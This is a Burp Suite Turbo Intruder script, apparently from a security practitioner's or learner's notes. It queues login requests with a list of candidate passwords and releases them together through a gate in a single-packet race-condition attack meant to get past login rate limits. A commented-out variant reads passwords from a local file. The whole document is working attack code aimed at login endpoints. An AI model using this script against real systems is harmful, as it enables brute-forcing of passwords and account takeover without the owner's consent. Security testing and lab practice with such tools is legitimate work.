## Burp Turbo Intruder script

# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
# def queueRequests(target, wordlists):
#     engine = RequestEngine(endpoint=target.endpoint,
#                            concurrentConnections=500,
#                            requestsPerConnection=100,
#                            pipeline=False
#                            )

#     # for i in range(3, 8):
#     #     engine.queue(target.req, randstr(i), learn=1)
#     #     engine.queue(target.req, target.baseInput, learn=2)

#     for word in open('/Users/vishal/Documents/security/materials/burp-data/tmp/password.txt'):
#         print(word+"vishal")
#         engine.queue(target.req, word.rstrip(), gate="1")
#     engine.openGate("1")


# def handleResponse(req, interesting):
#     table.add(req)


def queueRequests(target, wordlists):

    # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           engine=Engine.BURP2
                           )
    
    # assign the list of candidate passwords from your clipboard
    passwords = wordlists.clipboard[1:10]
    
    # queue a login request using each password from the wordlist
    # the 'gate' argument withholds the final part of each request until engine.openGate() is invoked
    for password in passwords:
        engine.queue(target.req, password, gate='1')
    
    # once every request has been queued
    # invoke engine.openGate() to send all requests in the given gate simultaneously
    engine.openGate('1')


def handleResponse(req, interesting):
    table.add(req)
